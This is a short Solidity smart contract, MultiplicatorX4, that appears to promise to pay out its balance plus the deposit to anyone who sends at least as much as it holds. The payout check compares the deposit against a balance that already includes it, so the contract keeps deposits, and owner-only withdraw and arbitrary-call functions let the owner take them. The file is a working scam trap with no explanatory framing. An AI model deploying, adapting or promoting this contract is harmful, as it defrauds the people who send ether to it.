pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner;
   
    function MultiplicatorX4() public {
        Owner = msg.sender;
    }
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        address _sender = msg.sender;
        require(_sender == Owner);
        address _owner = Owner;
        _owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        address _sender = msg.sender;
        require(_sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        uint256 _value = msg.value;
        uint256 _balance = this.balance;
        if(_value >= _balance)
        {        
            adr.transfer(_balance + _value);
        }
    }
}